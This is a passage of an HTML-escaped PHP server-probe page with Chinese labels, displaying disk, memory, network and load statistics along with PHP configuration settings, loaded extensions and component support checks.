    &lt;td colspan&#x3D;&quot;5&quot;&gt;&lt;?php if(&#39;&#x2F;&#39;&#x3D;&#x3D;DIRECTORY_SEPARATOR)&#123;echo $cpu_show.&quot; | &lt;a href&#x3D;&#39;&quot;.$phpSelf.&quot;?act&#x3D;cpu_percentage&#39; target&#x3D;&#39;_blank&#39; class&#x3D;&#39;static&#39;&gt;查看图表&lt;&#x2F;a&gt;&quot;;&#125;else&#123;echo &quot;暂时只支持Linux系统&quot;;&#125;?&gt;
	&lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt;
  &lt;tr&gt;
    &lt;td&gt;硬盘使用状况&lt;&#x2F;td&gt;
    &lt;td colspan&#x3D;&quot;5&quot;&gt;
		总空间 &lt;?php echo $dt;?&gt;&amp;nbsp;G，
		已用 &lt;font color&#x3D;&#39;#333333&#39;&gt;&lt;span id&#x3D;&quot;useSpace&quot;&gt;&lt;?php echo $du;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;font&gt;&amp;nbsp;G，
		空闲 &lt;font color&#x3D;&#39;#333333&#39;&gt;&lt;span id&#x3D;&quot;freeSpace&quot;&gt;&lt;?php echo $df;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;font&gt;&amp;nbsp;G，
		使用率 &lt;span id&#x3D;&quot;hdPercent&quot;&gt;&lt;?php echo $hdPercent;?&gt;&lt;&#x2F;span&gt;%
		&lt;div class&#x3D;&quot;bar&quot;&gt;&lt;div id&#x3D;&quot;barhdPercent&quot; class&#x3D;&quot;barli_black&quot; style&#x3D;&quot;width:&lt;?php echo $hdPercent;?&gt;%&quot; &gt;&amp;nbsp;&lt;&#x2F;div&gt; &lt;&#x2F;div&gt;
	&lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt;
  &lt;tr&gt;

		&lt;td&gt;内存使用状况&lt;&#x2F;td&gt;

		&lt;td colspan&#x3D;&quot;5&quot;&gt;

&lt;?php

$tmp &#x3D; array(

    &#39;memTotal&#39;, &#39;memUsed&#39;, &#39;memFree&#39;, &#39;memPercent&#39;,

    &#39;memCached&#39;, &#39;memRealPercent&#39;,

    &#39;swapTotal&#39;, &#39;swapUsed&#39;, &#39;swapFree&#39;, &#39;swapPercent&#39;

);

foreach ($tmp AS $v) &#123;

    $sysInfo[$v] &#x3D; $sysInfo[$v] ? $sysInfo[$v] : 0;

&#125;

?&gt;

          物理内存：共

          &lt;font color&#x3D;&#39;#CC0000&#39;&gt;&lt;?php echo $memTotal;?&gt; &lt;&#x2F;font&gt;

           , 已用

          &lt;font color&#x3D;&#39;#CC0000&#39;&gt;&lt;span id&#x3D;&quot;UsedMemory&quot;&gt;&lt;?php echo $mu;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;font&gt;

          , 空闲

          &lt;font color&#x3D;&#39;#CC0000&#39;&gt;&lt;span id&#x3D;&quot;FreeMemory&quot;&gt;&lt;?php echo $mf;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;font&gt;

          , 使用率

		  &lt;span id&#x3D;&quot;memPercent&quot;&gt;&lt;?php echo $memPercent;?&gt;&lt;&#x2F;span&gt;

          &lt;div class&#x3D;&quot;bar&quot;&gt;&lt;div id&#x3D;&quot;barmemPercent&quot; class&#x3D;&quot;barli_green&quot; style&#x3D;&quot;width:&lt;?php echo $memPercent?&gt;%&quot; &gt;&amp;nbsp;&lt;&#x2F;div&gt; &lt;&#x2F;div&gt;
&lt;?php
&#x2F;&#x2F;判断如果cache为0，不显示
if($sysInfo[&#39;memCached&#39;]&gt;0)
&#123;
?&gt;		
		  Cache化内存为 &lt;span id&#x3D;&quot;CachedMemory&quot;&gt;&lt;?php echo $mc;?&gt;&lt;&#x2F;span&gt;
		  , 使用率 
          &lt;span id&#x3D;&quot;memCachedPercent&quot;&gt;&lt;?php echo $memCachedPercent;?&gt;&lt;&#x2F;span&gt;
		  %	| Buffers缓冲为  &lt;span id&#x3D;&quot;Buffers&quot;&gt;&lt;?php echo $mb;?&gt;&lt;&#x2F;span&gt;
          &lt;div class&#x3D;&quot;bar&quot;&gt;&lt;div id&#x3D;&quot;barmemCachedPercent&quot; class&#x3D;&quot;barli_blue&quot; style&#x3D;&quot;width:&lt;?php echo $memCachedPercent?&gt;%&quot; &gt;&amp;nbsp;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;

          真实内存使用
          &lt;span id&#x3D;&quot;memRealUsed&quot;&gt;&lt;?php echo $memRealUsed;?&gt;&lt;&#x2F;span&gt;
		  , 真实内存空闲
          &lt;span id&#x3D;&quot;memRealFree&quot;&gt;&lt;?php echo $memRealFree;?&gt;&lt;&#x2F;span&gt;
		  , 使用率
          &lt;span id&#x3D;&quot;memRealPercent&quot;&gt;&lt;?php echo $memRealPercent;?&gt;&lt;&#x2F;span&gt;
          %
          &lt;div class&#x3D;&quot;bar_1&quot;&gt;&lt;div id&#x3D;&quot;barmemRealPercent&quot; class&#x3D;&quot;barli_1&quot; style&#x3D;&quot;width:&lt;?php echo $memRealPercent?&gt;%&quot; &gt;&amp;nbsp;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt; 
&lt;?php
&#125;
&#x2F;&#x2F;判断如果SWAP区为0，不显示
if($sysInfo[&#39;swapTotal&#39;]&gt;0)
&#123;
?&gt;	
          SWAP区：共
          &lt;?php echo $st;?&gt;
          , 已使用
          &lt;span id&#x3D;&quot;swapUsed&quot;&gt;&lt;?php echo $su;?&gt;&lt;&#x2F;span&gt;
          , 空闲
          &lt;span id&#x3D;&quot;swapFree&quot;&gt;&lt;?php echo $sf;?&gt;&lt;&#x2F;span&gt;
          , 使用率
          &lt;span id&#x3D;&quot;swapPercent&quot;&gt;&lt;?php echo $swapPercent;?&gt;&lt;&#x2F;span&gt;
          %
          &lt;div class&#x3D;&quot;bar&quot;&gt;&lt;div id&#x3D;&quot;barswapPercent&quot; class&#x3D;&quot;barli_red&quot; style&#x3D;&quot;width:&lt;?php echo $swapPercent?&gt;%&quot; &gt;&amp;nbsp;&lt;&#x2F;div&gt; &lt;&#x2F;div&gt;

&lt;?php
&#125;	
?&gt;		  

	  &lt;&#x2F;td&gt;

	&lt;&#x2F;tr&gt;
	  &lt;tr&gt;
		&lt;td&gt;系统平均负载&lt;&#x2F;td&gt;
		&lt;td colspan&#x3D;&quot;5&quot; class&#x3D;&quot;w_number&quot;&gt;&lt;span id&#x3D;&quot;loadAvg&quot;&gt;&lt;?php echo $load;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;td&gt;
	&lt;&#x2F;tr&gt;

&lt;&#x2F;table&gt;

&lt;?&#125;?&gt;



&lt;?php if (false !&#x3D;&#x3D; ($strs &#x3D; @file(&quot;&#x2F;proc&#x2F;net&#x2F;dev&quot;))) : ?&gt;

&lt;table&gt;

    &lt;tr&gt;&lt;th colspan&#x3D;&quot;5&quot;&gt;网络使用状况&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;

&lt;?php for ($i &#x3D; 2; $i &lt; count($strs); $i++ ) : ?&gt;

&lt;?php preg_match_all( &quot;&#x2F;([^\s]+):[\s]&#123;0,&#125;(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)&#x2F;&quot;, $strs[$i], $info );?&gt;

     &lt;tr&gt;

        &lt;td width&#x3D;&quot;13%&quot;&gt;&lt;?php echo $info[1][0]?&gt; : &lt;&#x2F;td&gt;
        &lt;td width&#x3D;&quot;29%&quot;&gt;入网: &lt;font color&#x3D;&#39;#CC0000&#39;&gt;&lt;span id&#x3D;&quot;NetInput&lt;?php echo $i?&gt;&quot;&gt;&lt;?php echo $NetInput[$i]?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;font&gt;&lt;&#x2F;td&gt;
		&lt;td width&#x3D;&quot;14%&quot;&gt;实时: &lt;font color&#x3D;&#39;#CC0000&#39;&gt;&lt;span id&#x3D;&quot;NetInputSpeed&lt;?php echo $i?&gt;&quot;&gt;0B&#x2F;s&lt;&#x2F;span&gt;&lt;&#x2F;font&gt;&lt;&#x2F;td&gt;
        &lt;td width&#x3D;&quot;29%&quot;&gt;出网: &lt;font color&#x3D;&#39;#CC0000&#39;&gt;&lt;span id&#x3D;&quot;NetOut&lt;?php echo $i?&gt;&quot;&gt;&lt;?php echo $NetOut[$i]?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;font&gt;&lt;&#x2F;td&gt;
		&lt;td width&#x3D;&quot;14%&quot;&gt;实时: &lt;font color&#x3D;&#39;#CC0000&#39;&gt;&lt;span id&#x3D;&quot;NetOutSpeed&lt;?php echo $i?&gt;&quot;&gt;0B&#x2F;s&lt;&#x2F;span&gt;&lt;&#x2F;font&gt;&lt;&#x2F;td&gt;

    &lt;&#x2F;tr&gt;

&lt;?php endfor; ?&gt;

&lt;&#x2F;table&gt;

&lt;?php endif; ?&gt;



&lt;table width&#x3D;&quot;100%&quot; cellpadding&#x3D;&quot;3&quot; cellspacing&#x3D;&quot;0&quot; align&#x3D;&quot;center&quot;&gt;

  &lt;tr&gt;

    &lt;th colspan&#x3D;&quot;4&quot;&gt;PHP已编译模块检测&lt;&#x2F;th&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td colspan&#x3D;&quot;4&quot;&gt;&lt;span class&#x3D;&quot;w_small&quot;&gt;

&lt;?php

$able&#x3D;get_loaded_extensions();

foreach ($able as $key&#x3D;&gt;$value) &#123;

	if ($key!&#x3D;0 &amp;&amp; $key%13&#x3D;&#x3D;0) &#123;

		echo &#39;&lt;br &#x2F;&gt;&#39;;

	&#125;

	echo &quot;$value&amp;nbsp;&amp;nbsp;&quot;;

&#125;

?&gt;&lt;&#x2F;span&gt;

    &lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

&lt;&#x2F;table&gt;

&lt;a name&#x3D;&quot;w_php&quot;&gt;&lt;&#x2F;a&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan&#x3D;&quot;4&quot;&gt;PHP相关参数&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td width&#x3D;&quot;32%&quot;&gt;PHP信息（phpinfo）：&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;18%&quot;&gt;

		&lt;?php

		$phpSelf &#x3D; $_SERVER[PHP_SELF] ? $_SERVER[PHP_SELF] : $_SERVER[SCRIPT_NAME];

		$disFuns&#x3D;get_cfg_var(&quot;disable_functions&quot;);

		?&gt;

    &lt;?php echo (false!&#x3D;&#x3D;eregi(&quot;phpinfo&quot;,$disFuns))? &#39;&lt;font color&#x3D;&quot;red&quot;&gt;×&lt;&#x2F;font&gt;&#39; :&quot;&lt;a href&#x3D;&#39;$phpSelf?act&#x3D;phpinfo&#39; target&#x3D;&#39;_blank&#39;&gt;PHPINFO&lt;&#x2F;a&gt;&quot;;?&gt;

    &lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;32%&quot;&gt;PHP版本（php_version）：&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;18%&quot;&gt;&lt;?php echo PHP_VERSION;?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;PHP运行方式：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo strtoupper(php_sapi_name());?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;脚本占用最大内存（memory_limit）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;memory_limit&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;PHP安全模式（safe_mode）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;safe_mode&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;POST方法提交最大限制（post_max_size）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;post_max_size&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;上传文件最大限制（upload_max_filesize）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;upload_max_filesize&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;浮点型数据显示的有效位数（precision）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;precision&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;脚本超时时间（max_execution_time）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;max_execution_time&quot;);?&gt;秒&lt;&#x2F;td&gt;

    &lt;td&gt;socket超时时间（default_socket_timeout）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;default_socket_timeout&quot;);?&gt;秒&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;PHP页面根目录（doc_root）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;doc_root&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;用户根目录（user_dir）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;user_dir&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;dl()函数（enable_dl）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;enable_dl&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;指定包含文件目录（include_path）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;include_path&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;显示错误信息（display_errors）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;display_errors&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;自定义全局变量（register_globals）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;register_globals&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;数据反斜杠转义（magic_quotes_gpc）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;magic_quotes_gpc&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;&quot;&lt;?...?&gt;&quot;短标签（short_open_tag）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;short_open_tag&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;&quot;&lt;% %&gt;&quot;ASP风格标记（asp_tags）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;asp_tags&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;忽略重复错误信息（ignore_repeated_errors）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;ignore_repeated_errors&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;忽略重复的错误源（ignore_repeated_source）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;ignore_repeated_source&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;报告内存泄漏（report_memleaks）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;report_memleaks&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;自动字符串转义（magic_quotes_gpc）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;magic_quotes_gpc&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;外部字符串自动转义（magic_quotes_runtime）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;magic_quotes_runtime&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;打开远程文件（allow_url_fopen）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;allow_url_fopen&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;声明argv和argc变量（register_argc_argv）：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;register_argc_argv&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Cookie 支持：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo isset($_COOKIE)?&#39;&lt;font color&#x3D;&quot;green&quot;&gt;√&lt;&#x2F;font&gt;&#39; : &#39;&lt;font color&#x3D;&quot;red&quot;&gt;×&lt;&#x2F;font&gt;&#39;;?&gt;&lt;&#x2F;td&gt;
    &lt;td&gt;拼写检查（ASpell Library）：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;aspell_check_raw&quot;);?&gt;&lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt;
   &lt;tr&gt;
    &lt;td&gt;高精度数学运算（BCMath）：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;bcadd&quot;);?&gt;&lt;&#x2F;td&gt;
    &lt;td&gt;PREL相容语法（PCRE）：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;preg_match&quot;);?&gt;&lt;&#x2F;td&gt;
   &lt;tr&gt;
    &lt;td&gt;PDF文档支持：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;pdf_close&quot;);?&gt;&lt;&#x2F;td&gt;
    &lt;td&gt;SNMP网络管理协议：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;snmpget&quot;);?&gt;&lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt; 
   &lt;tr&gt;
    &lt;td&gt;VMailMgr邮件处理：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;vm_adduser&quot;);?&gt;&lt;&#x2F;td&gt;
    &lt;td&gt;Curl支持：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;curl_init&quot;);?&gt;&lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt; 
   &lt;tr&gt;
    &lt;td&gt;SMTP支持：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo get_cfg_var(&quot;SMTP&quot;)?&#39;&lt;font color&#x3D;&quot;green&quot;&gt;√&lt;&#x2F;font&gt;&#39; : &#39;&lt;font color&#x3D;&quot;red&quot;&gt;×&lt;&#x2F;font&gt;&#39;;?&gt;&lt;&#x2F;td&gt;
    &lt;td&gt;SMTP地址：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo get_cfg_var(&quot;SMTP&quot;)?get_cfg_var(&quot;SMTP&quot;):&#39;&lt;font color&#x3D;&quot;red&quot;&gt;×&lt;&#x2F;font&gt;&#39;;?&gt;&lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt; 

	&lt;tr&gt;
		&lt;td&gt;默认支持函数（enable_functions）：&lt;&#x2F;td&gt;
		&lt;td colspan&#x3D;&quot;3&quot;&gt;&lt;a href&#x3D;&#39;&lt;?php echo $phpSelf;?&gt;?act&#x3D;Function&#39; target&#x3D;&#39;_blank&#39; class&#x3D;&#39;static&#39;&gt;请点这里查看详细！&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;		
	&lt;&#x2F;tr&gt;
	&lt;tr&gt;
		&lt;td&gt;被禁用的函数（disable_functions）：&lt;&#x2F;td&gt;
		&lt;td colspan&#x3D;&quot;3&quot; class&#x3D;&quot;word&quot;&gt;
&lt;?php 
$disFuns&#x3D;get_cfg_var(&quot;disable_functions&quot;);
if(empty($disFuns))
&#123;
	echo &#39;&lt;font color&#x3D;red&gt;×&lt;&#x2F;font&gt;&#39;;
&#125;
else
&#123; 
	&#x2F;&#x2F;echo $disFuns;
	$disFuns_array &#x3D;  explode(&#39;,&#39;,$disFuns);
	foreach ($disFuns_array as $key&#x3D;&gt;$value) 
	&#123;
		if ($key!&#x3D;0 &amp;&amp; $key%5&#x3D;&#x3D;0) &#123;
			echo &#39;&lt;br &#x2F;&gt;&#39;;
	&#125;
	echo &quot;$value&amp;nbsp;&amp;nbsp;&quot;;
&#125;	
&#125;

?&gt;
		&lt;&#x2F;td&gt;
	&lt;&#x2F;tr&gt;

&lt;&#x2F;table&gt;

&lt;a name&#x3D;&quot;w_module&quot;&gt;&lt;&#x2F;a&gt;

&lt;!--组件信息--&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan&#x3D;&quot;4&quot; &gt;组件支持&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td width&#x3D;&quot;32%&quot;&gt;FTP支持：&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;18%&quot;&gt;&lt;?php echo isfun(&quot;ftp_login&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;32%&quot;&gt;XML解析支持：&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;18%&quot;&gt;&lt;?php echo isfun(&quot;xml_set_object&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;Session支持：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;session_start&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;Socket支持：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;socket_accept&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;Calendar支持&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&#39;cal_days_in_month&#39;);?&gt;
	&lt;&#x2F;td&gt;

    &lt;td&gt;允许URL打开文件：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;allow_url_fopen&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;GD库支持：&lt;&#x2F;td&gt;

    &lt;td&gt;

    &lt;?php

        if(function_exists(gd_info)) &#123;

            $gd_info &#x3D; @gd_info();

	        echo $gd_info[&quot;GD Version&quot;];

	    &#125;else&#123;echo &#39;&lt;font color&#x3D;&quot;red&quot;&gt;×&lt;&#x2F;font&gt;&#39;;&#125;

	?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;压缩文件支持(Zlib)：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;gzclose&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;IMAP电子邮件系统函数库：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;imap_close&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;历法运算函数库：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;JDToGregorian&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;正则表达式函数库：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;preg_match&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;WDDX支持：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;wddx_add_vars&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;Iconv编码转换：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;iconv&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;mbstring：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;mb_eregi&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;高精度数学运算：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;bcadd&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;LDAP目录协议：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;ldap_close&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;MCrypt加密处理：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;mcrypt_cbc&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;哈稀计算：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;mhash_count&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

&lt;&#x2F;table&gt;

&lt;a name&#x3D;&quot;w_module_other&quot;&gt;&lt;&#x2F;a&gt;
&lt;!--第三方组件信息--&gt;
&lt;table&gt;
  &lt;tr&gt;&lt;th colspan&#x3D;&quot;4&quot; &gt;第三方组件&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;
  &lt;tr&gt;
    &lt;td width&#x3D;&quot;32%&quot;&gt;Zend版本&lt;&#x2F;td&gt;
    &lt;td width&#x3D;&quot;18%&quot;&gt;&lt;?php $zend_version &#x3D; zend_version();if(empty($zend_version))&#123;echo &#39;&lt;font color&#x3D;red&gt;×&lt;&#x2F;font&gt;&#39;;&#125;else&#123;echo $zend_version;&#125;?&gt;&lt;&#x2F;td&gt;
    &lt;td width&#x3D;&quot;32%&quot;&gt;
&lt;?php
$PHP_VERSION &#x3D; PHP_VERSION;
$PHP_VERSION &#x3D; substr($PHP_VERSION,2,1);
if($PHP_VERSION &gt; 2)
&#123;
	echo &quot;ZendGuardLoader[启用]&quot;;
&#125;
else
&#123;
	echo &quot;Zend Optimizer&quot;;
&#125;
?&gt;
	&lt;&#x2F;td&gt;
    &lt;td width&#x3D;&quot;18%&quot;&gt;&lt;?php if($PHP_VERSION &gt; 2)&#123;echo (get_cfg_var(&quot;zend_loader.enable&quot;))?&#39;&lt;font color&#x3D;green&gt;√&lt;&#x2F;font&gt;&#39;:&#39;&lt;font color&#x3D;red&gt;×&lt;&#x2F;font&gt;&#39;;&#125; else&#123;if(function_exists(&#39;zend_optimizer_version&#39;))&#123;	echo zend_optimizer_version();&#125;else&#123;	echo (get_cfg_var(&quot;zend_optimizer.optimization_level&quot;)||get_cfg_var(&quot;zend_extension_manager.optimizer_ts&quot;)||get_cfg_var(&quot;zend.ze1_compatibility_mode&quot;)||get_cfg_var(&quot;zend_extension_ts&quot;))?&#39;&lt;font color&#x3D;green&gt;√&lt;&#x2F;font&gt;&#39;:&#39;&lt;font color&#x3D;red&gt;×&lt;&#x2F;font&gt;&#39;;&#125;&#125;?&gt;&lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt;
  &lt;tr&gt;
    &lt;td&gt;eAccelerator&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php if((phpversion(&#39;eAccelerator&#39;))!&#x3D;&#39;&#39;)&#123;echo phpversion(&#39;eAccelerator&#39;);&#125;else&#123; echo &quot;&lt;font color&#x3D;red&gt;×&lt;&#x2F;font&gt;&quot;;&#125; ?&gt;&lt;&#x2F;td&gt;
    &lt;td&gt;ioncube&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php if(extension_loaded(&#39;ionCube Loader&#39;))&#123;   $ys &#x3D; ioncube_loader_iversion();   $gm &#x3D; &quot;.&quot;.(int)substr($ys,3,2);   echo ionCube_Loader_version().$gm;&#125;else&#123;echo &quot;&lt;font color&#x3D;red&gt;×&lt;&#x2F;font&gt;&quot;;&#125;?&gt;&lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt;
  &lt;tr&gt;
    &lt;td&gt;XCache&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php if((phpversion(&#39;XCache&#39;))!&#x3D;&#39;&#39;)&#123;echo phpversion(&#39;XCache&#39;);&#125;else&#123; echo &quot;&lt;font color&#x3D;red&gt;×&lt;&#x2F;font&gt;&quot;;&#125; ?&gt;&lt;&#x2F;td&gt;
    &lt;td&gt;APC&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php if((phpversion(&#39;APC&#39;))!&#x3D;&#39;&#39;)&#123;echo phpversion(&#39;APC&#39;);&#125;else&#123; echo &quot;&lt;font color&#x3D;red&gt;×&lt;&#x2F;font&gt;&quot;;&#125; ?&gt;&lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt;
&lt;&#x2F;table&gt;

&lt;a name&#x3D;&quot;w_db&quot;&gt;&lt;&#x2F;a&gt;

&lt;!--数据库支持--&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan&#x3D;&quot;4&quot;&gt;数据库支持&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td width&#x3D;&quot;32%&quot;&gt;MySQL 数据库：&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;18%&quot;&gt;&lt;?php echo isfun(&quot;mysql_close&quot;);?&gt;

    &lt;?php
    if(function_exists(&quot;mysql_get_server_info&quot;)) &#123;

        $s &#x3D; @mysql_get_server_info();

